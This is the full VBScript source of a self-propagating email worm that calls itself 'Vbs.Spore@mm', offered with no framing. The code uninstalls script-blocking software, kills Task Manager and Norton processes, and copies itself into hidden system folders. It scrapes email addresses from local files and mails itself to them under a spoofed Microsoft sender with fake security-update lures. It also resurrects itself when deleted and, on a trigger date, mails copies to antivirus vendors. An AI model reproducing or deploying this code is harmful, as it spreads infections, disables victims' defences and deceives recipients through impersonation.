Option Explicit
Dim Wmi, ScriptBlocker, WShell, Fso, RegKey, RegValue, RegKey2
Dim RegValue2, AppPath, AppName, BackUpPath, BackUpName, BackUpPath2 
Dim BackUpName2, DropVbsFile, DropRegFile, DropRegFile2, HideFolder
Dim NavProcess, Drives, Drive, Path, Folder, Files, File, SrchExten, SourceCode
Dim AllSourceCode, TxtLen, MailVictim, TxtCnt, SubFolders, SubFolder, RndNum
Dim Fake_EmailName, MailLoop, Mail_Subject, Mail_Body, Mail_To, CdoMail, MailConfig
Dim MailFields, VxMsg, AllSporeSource, Spore, MailTo 


Set Wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2") 
For Each ScriptBlocker In Wmi.ExecQuery("Select * from Win32_Product") 
On Error Resume Next
If Instr(ScriptBlocker.Name,"Script") And Instr(ScriptBlocker.Name,"Block") Then 
ScriptBlocker.UnInstall() 
End If 
Next

Set WShell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

RegKey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"
RegValue = WShell.RegRead(RegKey & "Spore")
RegKey2 = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"
RegValue2 = WShell.RegRead(RegKey2 & "DisallowRun")

AppPath = "C:\WINDOWS\System32"
AppName = "MsNews.vbs"
BackUpPath = "C:\WINDOWS\SysLogs"
BackUpName = "Syslog32.vbs"
BackUpPath2 = "C:\Program Files\WindowsUpdate\Wupdmgr.tmp"
BackUpName2 = "Wupdscn.vbs"

If Not (Fso.FileExists(AppPath & "\" & "Tskmgr32.vbs")) Then
Set DropVbsFile = Fso.CreateTextFile(AppPath & "\" & "Tskmgr32.vbs")
DropVbsFile.WriteLine ""
DropVbsFile.WriteLine "  'Vbs File Droped By : Vbs.Spore@mm"
DropVbsFile.WriteLine ""
DropVbsFile.WriteLine " Dim StopProcess"
DropVbsFile.WriteLine ""
DropVbsFile.WriteLine "Do"
DropVbsFile.WriteLine "For Each StopProcess In GetObject" & "(""winmgmts:"")" & ". _"
DropVbsFile.WriteLine " ExecQuery" & "(""select name from Win32_Process where name = 'Taskmgr.exe'"")"
DropVbsFile.WriteLine " StopProcess.Terminate (0)"
DropVbsFile.WriteLine "Next"
DropVbsFile.WriteLine "Loop"
DropVbsFile.Close
Wshell.Run AppPath & "\" & "Tskmgr32.vbs"
Else
Wshell.Run AppPath & "\" & "Tskmgr32.vbs"  
End If

If Not (Fso.FileExists(AppPath & "\" & AppName)) Then 
Fso.CopyFile WScript.ScriptFullName, AppPath & "\" & AppName
End If

If Not (Fso.FolderExists(BackUpPath)) Then 
Fso.CreateFolder (BackUpPath)
Fso.CopyFile WScript.ScriptFullName, BackUpPath & "\" & BackUpName
Set HideFolder = Fso.GetFolder(BackUpPath)
HideFolder.Attributes = 34
End If

If Not (Fso.FolderExists(BackUpPath2)) Then 
Fso.CreateFolder (BackUpPath2)
Fso.CopyFile WScript.ScriptFullName, BackUpPath2 & "\" & BackUpName2
Set HideFolder = Fso.GetFolder(BackUpPath2)
HideFolder.Attributes = 34
End If

For Each NavProcess In GetObject("winmgmts:"). _
ExecQuery("select name from Win32_Process where name = 'ccApp.exe'")
NavProcess.Terminate (0)
Next

If Month(NOW) = 1 And Day(NOW) = 1 And Year(Now) = 2005 then
Notify_AvCompanys()
Show_MsgBox()
Wshell.Run "ccApp.exe" 
Anti_Delete()
End If

Set Drives = Fso.Drives
For Each Drive In Drives
If Drive.DriveType = 2 Or Drive.DriveType = 3 Then
DoSearchIn(Drive)
End If
Next

Wshell.Run "ccApp.exe" 
Anti_Delete()

Function DoSearchIn(Path)
On Error Resume Next

Set Fso = CreateObject("Scripting.FileSystemObject")
Set Folder = Fso.GetFolder(Path)
Set Files = Folder.Files
For Each File In Files

SrchExten = Fso.GetExtensionName(File.Path)
SrchExten = LCase(SrchExten)
If (SrchExten = "htt") Or (SrchExten = "htm") Or (SrchExten = "html") _
Or (SrchExten = "hta") Or (SrchExten = "hte") Or (SrchExten = "htx") _
Or (SrchExten = "shtml") Or (SrchExten = "stm") Or (SrchExten = "asp")  _
Or (SrchExten = "xml") Or (SrchExten = "doc") Or (SrchExten = "rtf") _
Or (SrchExten = "txt") Then

Set SourceCode = Fso.OpenTextFile(File.Path, 1)
AllSourceCode = SourceCode.ReadAll
SourceCode.Close
For TxtLen = 1 To Len(AllSourceCode)
If Mid(AllSourceCode, TxtLen, 7) = "mailto:" Then
MailVictim = ""
TxtCnt = 0
Do While Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1) <> """"
MailVictim = MailVictim + Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1)
TxtCnt = TxtCnt + 1
Loop

EmailTo(File.Path)
End If
Next
SourceCode = ""
AllSourceCode = ""
MailVictim = ""
End If
Next
Set SubFolders = Folder.SubFolders
For Each SubFolder In SubFolders
DoSearchIn(SubFolder.Path)
Next
End Function

Function EmailTo(MailTo)
On Error Resume Next

Randomize
RndNum = Int((10 * Rnd) + 1)
Select Case RndNum
Case 1
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Microsoft Updates News" 
Case 2
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Security Updates News"
Case 3
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Service Pack 2 Updates News"  
Case 4
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "System Updates News"
Case 5
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Microsoft Operating System Updates News" 
Case 6
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Microsoft Security Updates News" 
Case 7
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Microsoft Update News Letter" 
Case 8
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Microsoft News" 
Case 9
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Update News" 
Case 10
 Fake_EmailName = "support@microsoft.com"
 Mail_Subject = "Microsoft`s big security Update News" 
End Select

 Mail_Body = "Service pack 2 is due soon for microsoft users, Bug fixes, internet explorer patches and <BR>" & _
 " NEW security features. Please read more from the file attcahed to this microsoft news letter." 

Set CdoMail = CreateObject("CDO.Message")
Set MailConfig = CreateObject("CDO.Configuration")
Set MailFields = MailConfig.Fields
With CdoMail
.Configuration = MailConfig
.To = MailVictim
.From = Fake_EmailName
.Subject = Mail_Subject
.HTMLBody = Mail_Body
.AddAttachment (AppPath & "\" & AppName)
.Send
End With
Set MailFields = Nothing
Set MailConfig = Nothing
Set CdoMail = Nothing
End Function

Function Notify_AvCompanys()
On Error Resume Next

For MailLoop = 1 To 10
Select Case MailLoop
Case 1
 Mail_To = "support@sophos.com"
 Mail_Subject = "A strange vbs file on my pc..!!"
Case 2
 Mail_To = "newvirus@kaspersky.com"
 Mail_Subject = "Is this vbs file appart of windows operating system..??" 
Case 3
 Mail_To = "virus_research@nai.com"
 Mail_Subject = "I found a vbs virus on my pc.!!"
Case 4
 Mail_To = "info@mcafee.com"
 Mail_Subject = " HELP.. i`ve been infected with a vbs virus.." 
Case 5
 Mail_To = "virus_doctor@trendmicro.com"
 Mail_Subject = "I think i have a vbs virus..??"
Case 6
 Mail_To = "support@support.trendmicro.com"
 Mail_Subject = "HELP... vbs virus infection..!!!"  
Case 7
 Mail_To = "samples@f-secure.com"
 Mail_Subject = "Here is a new vbs virus i found..!!" 
Case 8
 Mail_To = "anti-virus-support@f-secure.com"
 Mail_Subject = "My system has been infected with a vbs file..!!" 
Case 9
 Mail_To = "vsample@avertlabs.com"
 Mail_Subject = "Not again, I`ve just been infected again.. (vbs)" 
Case 10
 Mail_To = "SecurityResponse@Symantec.com"
 Mail_Subject = "My pc is acting strange..??" 
End Select

 Fake_EmailName = "billgates@microsoft.com"

 Mail_Body = "Hello, <BR> <BR>" & _
 " I found this vbs file on my pc. But i`m not too sure if it is a virus <BR>" & _
 " so i am sending you a copy for safety reasons..!"  

Set CdoMail = CreateObject("CDO.Message")
Set MailConfig = CreateObject("CDO.Configuration")
Set MailFields = MailConfig.Fields
With CdoMail
.Configuration = MailConfig
.To = Mail_To
.From = Fake_EmailName
.Subject = Mail_Subject
.HTMLBody = Mail_Body
.AddAttachment (BackUpPath2 & "\" & BackUpName2)
.Send
End With
Set MailFields = Nothing
Set MailConfig = Nothing
Set CdoMail = Nothing
Next 
End Function

Function Show_MsgBox()
VxMsg = "W A R N I N G :" & VbCrLf & VbCrLf
VxMsg = VxMsg & " Your system resources is in a critical state." & VbCrLf
VxMsg = VxMsg & " To avoid any damages to you system or files, Please" & VbCrLf
VxMsg = VxMsg & " restart you computer or contact the system administrator."
MsgBox VxMsg, VbCritical, "Vbs.Spore@mm  (c) 2004"
End Function

Function Anti_Delete()
Set Spore = Fso.OpenTextFile(WScript.ScriptFullName, 1)
AllSporeSource = Spore.ReadAll
Spore.Close

Do
If (Fso.FileExists(WScript.ScriptFullName)) = False Then
Set Spore = Fso.CreateTextFile(WScript.ScriptFullName, True)
Spore.Write AllSporeSource
Spore.Close 
End If
Loop 
End Function
